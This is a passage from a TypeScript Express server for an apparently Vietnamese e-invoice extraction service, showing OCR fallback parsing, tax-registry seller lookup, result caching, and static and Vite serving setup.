              vatAmount:
                typeof parsedJson.vatAmount === 'number' && parsedJson.vatAmount >= 0
                  ? parsedJson.vatAmount
                  : undefined,
              totalAmount:
                typeof parsedJson.totalAmount === 'number' && parsedJson.totalAmount > 0
                  ? parsedJson.totalAmount
                  : undefined,
            };

            const evaluated = parseAndEvaluateInvoice(
              safeFileName,
              combinedInvoiceContent,
              mergedOverrides,
              sellerEnt
            );
            return { result: evaluated, extractedText: combinedInvoiceContent.slice(0, 8000) };
          } catch {
            // Fall back to deterministic XML / unpdf PDF text parser below
          } finally {
            activeGeminiOcrRequests = Math.max(0, activeGeminiOcrRequests - 1);
          }
        }

        // Extract seller MST from XML or unpdf-extracted PDF text and resolve real enterprise from tax registry
        const prelim = parseAndEvaluateInvoice(safeFileName, combinedInvoiceContent);
        const { record: realSellerRecord } = await resolveRealEnterpriseFromTaxRegistry(
          prelim.sellerMst,
          ai
        );
        const evaluated = parseAndEvaluateInvoice(
          safeFileName,
          combinedInvoiceContent,
          undefined,
          realSellerRecord
        );
        return { result: evaluated, extractedText: combinedInvoiceContent.slice(0, 8000) };
      })()
        .then((out) => {
          setBoundedMapEntry(
            invoiceExtractionCache,
            payloadSignature,
            {
              result: out.result,
              extractedText: out.extractedText,
              expiresAt: Date.now() + INVOICE_CACHE_TTL_MS,
            },
            INVOICE_CACHE_MAX
          );
          return out;
        })
        .finally(() => {
          inFlightInvoiceExtractions.delete(payloadSignature);
        });

      inFlightInvoiceExtractions.set(payloadSignature, extractionTask);
      const output = await extractionTask;
      res.json(output);
    } catch (error) {
      res.status(500).json({
        error: error instanceof Error ? error.message : 'Lỗi bóc tách hóa đơn điện tử.',
      });
    }
  });

  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(__dirname, 'dist');
    app.use(
      express.static(distPath, {
        maxAge: '1h',
        etag: true,
      })
    );
    app.get('*', (_req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`MASOTHUE AI Server running on http://localhost:${PORT} (High-Concurrency 5000+ CCU Mode)`);
  });

  // Tune HTTP server for 5,000+ concurrent connections
  server.maxConnections = 10000;
  server.keepAliveTimeout = 65000;
  server.headersTimeout = 66000;
}

startServer();
